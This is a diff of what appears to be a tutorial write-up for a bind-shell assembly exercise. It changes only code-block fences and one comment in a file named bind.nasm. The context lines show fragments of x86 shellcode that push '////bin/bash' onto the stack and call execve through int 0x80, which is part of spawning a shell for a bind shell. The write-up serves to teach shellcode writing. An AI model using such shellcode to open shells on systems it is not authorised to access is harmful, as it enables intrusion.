@@ -235,9 +235,7 @@ With the connection to the selected port being successful:
 
 The assembly code that was written for this exercise is as follows:
 
-~~
-
-
+```
 ; Filename: bind.nasm
 ; Author:   Jake
 ; Website:  http://github.com/14deep
@@ -361,7 +359,7 @@ _start:
     	xor eax, eax  ; Clearing eax
     	push eax      ; Pushing 0 to the stack
 	
-   	;push bin bash command
+   	; push ////bin/bash (12), could be shortened to //bin/sh (8)
     	push 0x68736162
    	push 0x2f6e6962
     	push 0x2f2f2f2f
@@ -373,7 +371,7 @@ _start:
 
     	mov al, 0xb   ; Moving 11 to eax for execve syscall
     	int 0x80      ; Interupt to call the syscall
-~~~
+```
 
 
 
